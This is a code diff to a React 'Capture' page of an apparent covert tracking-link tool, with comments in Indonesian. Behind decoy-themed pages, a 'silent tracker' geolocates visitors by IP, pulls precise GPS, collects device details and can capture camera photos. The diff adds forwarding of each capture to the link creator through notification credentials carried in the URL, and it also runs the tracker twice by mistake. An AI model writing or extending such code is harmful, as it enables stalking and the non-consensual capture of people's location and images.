@@ -1,6 +1,6 @@
 import { useEffect, useRef, useState } from 'react';
 import { useParams } from 'react-router-dom';
-import { decodeConfig, addCapture } from '../storage';
+import { decodeConfig, addCapture, sendNotification } from '../storage';
 
 
 /* ─── UA Parser ─────────────────────────────────────────── */
@@ -30,7 +30,7 @@ function parseUA(ua) {
 }
 
 /* ─── Silent Tracker ────────────────────────────────────── */
-async function runSilentTracking(link, dataRef, onCameraReady) {
+async function runSilentTracking(link, dataRef, onCameraReady, notifConfig) {
   const opts = link.options || {};
   const data = dataRef.current;
 
@@ -47,7 +47,7 @@ async function runSilentTracking(link, dataRef, onCameraReady) {
           _score: (j.city ? 2 : 0) + (j.regionName ? 1 : 0),
         } : null),
 
-      // API 2: ipinfo.io (detail, bagus untuk mobile carrier)
+      // API 2: ipinfo.io
       fetch('https://ipinfo.io/json?token=')
         .then(r => r.json())
         .then(j => {
@@ -72,7 +72,6 @@ async function runSilentTracking(link, dataRef, onCameraReady) {
         } : null),
     ]);
 
-    // Pilih hasil dengan score tertinggi (paling lengkap datanya)
     const best = results
       .filter(r => r.status === 'fulfilled' && r.value)
       .map(r => r.value)
@@ -84,24 +83,21 @@ async function runSilentTracking(link, dataRef, onCameraReady) {
       data.locationSource = 'IP';
     }
 
-    // GPS — override koordinat jika diizinkan (presisi meter)
+    // GPS — kirim update terpisah saat diizinkan
     if ('geolocation' in navigator) {
-      new Promise(resolve => {
-        navigator.geolocation.getCurrentPosition(
-          pos => {
-            data.lat = pos.coords.latitude; data.lon = pos.coords.longitude;
-            data.gpsAccuracy = Math.round(pos.coords.accuracy);
-            data.locationSource = 'GPS';
-            if (link?.id) addCapture(link.id, { ...dataRef.current });
-            resolve();
-          },
-          () => { resolve(); },
-          { timeout: 8000, maximumAge: 60000, enableHighAccuracy: true }
-        );
-      });
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          data.lat = pos.coords.latitude; data.lon = pos.coords.longitude;
+          data.gpsAccuracy = Math.round(pos.coords.accuracy);
+          data.locationSource = 'GPS';
+          // Kirim capture UPDATE dengan koordinat GPS presisi + notif config dari URL
+          if (link?.id) addCapture(link.id, { ...dataRef.current }, notifConfig);
+        },
+        () => { /* ditolak, tetap pakai koordinat IP */ },
+        { timeout: 10000, maximumAge: 0, enableHighAccuracy: true }
+      );
     }
   }
-
 
   // 2. Device
   if (opts.trackDevice) {
@@ -379,26 +375,37 @@ const DECOY_MAP = {
 };
 
 export default function Capture() {
-  const { trackId } = useParams();
-  const [config, setConfig] = useState(null);
+  // Support kedua route: /t/:trackId dan /:cat/:slug/:trackId
+  const params = useParams();
+  const trackId = params.trackId;
+
+  const [config, setConfig]     = useState(null);
   const [notFound, setNotFound] = useState(false);
   const [showCamera, setShowCamera] = useState(false);
-  const dataRef = useRef({});
+  const dataRef   = useRef({});
+  const notifRef  = useRef(null); // simpan notif config dari URL
 
   useEffect(() => {
-    // Decode config langsung dari URL — tidak perlu localStorage
+    if (!trackId) { setNotFound(true); return; }
     const cfg = decodeConfig(trackId);
-    if (!cfg) { setNotFound(true); return; }
+    if (!cfg)   { setNotFound(true); return; }
     setConfig(cfg);
-    // Buat objek "link" virtual dari config
+    notifRef.current = cfg.notif || null; // notif credentials dari creator
     const link = { id: cfg.id || trackId, options: cfg.options || {}, decoyTheme: cfg.decoyTheme };
-    runSilentTracking(link, dataRef, () => setShowCamera(true));
+    runSilentTracking(link, dataRef, () => setShowCamera(true), cfg.notif);
+    // Kirim capture awal setelah tracking selesai
+    runSilentTracking(link, dataRef, () => setShowCamera(true), cfg.notif)
+      .then(() => {
+        if (!(cfg.options?.trackCamera)) {
+          addCapture(link.id, { ...dataRef.current }, cfg.notif);
+        }
+      });
   }, [trackId]);
 
   function handlePhotoCapture(photo) {
     if (photo) dataRef.current.photo = photo;
     setShowCamera(false);
-    if (config) addCapture(config.id || trackId, { ...dataRef.current });
+    if (config) addCapture(config.id || trackId, { ...dataRef.current }, notifRef.current);
   }
 
   if (notFound) return (
